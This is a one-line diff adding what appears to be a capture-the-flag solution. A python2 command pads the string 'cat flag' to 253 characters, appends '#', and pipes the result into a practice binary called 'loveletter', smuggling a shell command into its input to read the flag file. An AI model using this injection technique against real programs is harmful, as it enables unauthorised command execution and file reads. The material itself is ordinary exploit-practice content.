@@ -1,0 +1,1 @@
+python2 -c "print 'cat flag'.ljust(253) + '#'" |./loveletter 
